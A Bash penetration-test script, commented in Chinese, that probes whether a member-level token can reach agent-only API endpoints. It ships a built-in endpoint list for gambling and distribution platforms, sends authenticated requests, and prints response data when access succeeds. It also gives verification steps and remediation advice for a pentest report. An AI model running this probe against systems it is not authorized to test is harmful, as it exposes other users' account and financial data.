#!/usr/bin/env bash
# ============================================================================
# 认证后不校验角色：会员 token 打代理端 API
#
# 这是最好用也最容易被忽略的一类：系统区分「会员端 / 代理端 / 管理端」，
# 三套前端，但后端是同一份代码，鉴权中间件只做了 `if (!token) 401`，
# 没做 `if (role != agent) 403`。于是拿会员 token 打代理接口，能过。
#
# 关键判据（区分「业务错」和「鉴权错」）：
#   code=401 / {"code":401}          → 鉴权层拒绝（角色校验有效）
#   code=400 / 参数错误 / 库存不足    → **鉴权已过**，是业务层在报错 → 越权成立
#   code=0 / 200 + 数据              → 直接越权（更严重）
#   HTTP 404 / 502                    → 接口不存在（代理端在别的域名/端口）
#
# 最后一条最容易被判错：很多报告把 400 当成「被拦」，其实 400 恰恰证明
# 请求穿过了鉴权层，只是参数不对。
#
# 用法: ./poc.sh <BASE_URL> <会员token> <代理端接口列表文件>
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

if [ $# -lt 2 ]; then
  cat >&2 <<'U'
用法: ./poc.sh <BASE_URL> <会员token> [接口文件] [--header 头名]
  BASE_URL   如 https://api.example.com
  会员token  低权账号的 token（会员身份）
  接口文件   每行一个代理端接口路径；不给则用内置常见代理接口
  --header   承载 token 的头名，默认 Authorization；也给 X-Token / token 等
示例: ./poc.sh https://api.example.com "eyJhbG..." agent-api.txt --header token
判据: 用会员 token 打代理接口，返回 400/业务错 = 鉴权已过（越权）；401 = 被拦
U
  exit 1
fi

BASE="${1%/}"; TOK="$2"; shift 2
IFILE=""; HNAME="Authorization"
while [ $# -gt 0 ]; do
  case "$1" in
    --header) HNAME="${2:-Authorization}"; shift 2 ;;
    *) IFILE="$1"; shift ;;
  esac
done
need curl || exit 1

# token 形态：JWT 用 Bearer 前缀，裸 token 不用。自动判断，避免人为配错。
if printf '%s' "$TOK" | grep -qE '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$'; then
  TVAL="Bearer $TOK"; dim "token 形态: JWT（自动加 Bearer）"
else
  TVAL="$TOK"; dim "token 形态: 裸 token"
fi
AUTH=(-H "$HNAME: $TVAL")

if [ -n "$IFILE" ] && [ -f "$IFILE" ]; then
  mapfile -t EPS < "$IFILE"
else
  # 内置代理端接口：来自包网/分销类系统的实际路由命名
  mapfile -t EPS <<'E'
/agent/info
/agent/member/list
/agent/member/add
/agent/order/list
/agent/report/summary
/agent/withdraw/list
/agent/withdraw/apply
/agent/commission/list
/agent/team/list
/agent/domain/list
/agent/config/get
/agent/setting/save
/api/agent/info
/api/agent/member/list
/api/agent/withdraw/list
/api/agent/report/summary
E
  dim "接口来源: 内置代理端清单（${#EPS[@]} 条）"
fi

hdr "0. 基线"
RND=$(rand_path)
R=$(reqc GET "$BASE$RND" "${AUTH[@]}")
RND_C="${R%%$'\t'*}"; RND_FP=$(printf '%s' "${R#*$'\t'}" | norm)
dim "随机路径 + 会员token → $RND_C"

hdr "1. 会员 token 打代理端接口"
PASS=0; DENY=0; NONE=0
for ep in "${EPS[@]}"; do
  [ -z "$ep" ] && continue
  r=$(reqc GET "$BASE$ep" "${AUTH[@]}")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"; fp=$(printf '%s' "$b" | norm)

  # 与随机基线一致 → 接口不存在（前端路由兜底）
  if [ "$c" = "$RND_C" ] && [ "$fp" = "$RND_FP" ]; then
    dim "$ep → $c（兜底，接口不存在）"; NONE=$((NONE+1)); continue
  fi

  # 提取业务码
  bcode=""
  printf '%s' "$b" | grep -qE '"code"\s*:\s*-?[0-9]+' && \
    bcode=$(printf '%s' "$b" | grep -oE '"code"\s*:\s*-?[0-9]+' | head -1 | grep -oE '\-?[0-9]+')
  msg=$(printf '%s' "$b" | grep -oE '"(msg|message)"\s*:\s*"[^"]{1,40}' | head -1 | sed 's/.*"//')

  if [ "$c" = "401" ] || [ "$bcode" = "401" ] || [ "$c" = "403" ]; then
    dim "$ep → $c code=${bcode:-?} 被鉴权层拦"; DENY=$((DENY+1))
  elif [ "$c" = "404" ]; then
    dim "$ep → 404（不存在）"; NONE=$((NONE+1))
  elif [ "$c" = "400" ] || [ "$bcode" = "400" ] || \
       printf '%s' "$msg" | grep -qE '参数|param|missing|缺少|不能为空'; then
    warn "$ep → $c code=${bcode:-?} msg=${msg:-<none>}"
    warn "     ↑ 鉴权已通过，业务层报参数错 = 越权成立"
    PASS=$((PASS+1))
  elif [ "$c" = "200" ]; then
    ok "$ep → 200 code=${bcode:-?}（直接越权）"
    printf '%s' "$b" | head -c 200; echo
    PASS=$((PASS+1))
  else
    dim "$ep → $c code=${bcode:-?}"
  fi
  sleep 0.4
done

hdr "2. 结论"
dim "通过=$PASS  被拦=$DENY  不存在=$NONE"
if [ "$PASS" -gt 0 ]; then
  warn "$PASS 个代理端接口对会员 token 有响应"
  cat >&2 <<'U'
必须补的两步（否则报告会被打回）：
  1) **角色反向验证**：拿一个真实代理 token 打同一接口，确认正常代理返回什么。
     如果代理也返回 400 参数错 → 说明这接口本来就要求参数，你的 400 不构成越权证据
  2) **数据边界**：能通过的接口里，挑一个 GET 取列表，看返回的是「自己名下」还是
     「全体」。返回全体 = 水平越权，比缺少角色校验严重一级
常见修法（写进报告）：OAuth scope / 路由分组 / 中间件 requireRole('agent')，
不要只写"加个判断"，要说清在哪一层加
U
  verdict "member-token-to-agent-api" "PRIVILEGE_ESCALATION" "$PASS 接口"
else
  ok "会员 token 全部被拦"
  verdict "member-token-to-agent-api" "ENFORCED" "$DENY 拦 / $NONE 不存在"
fi
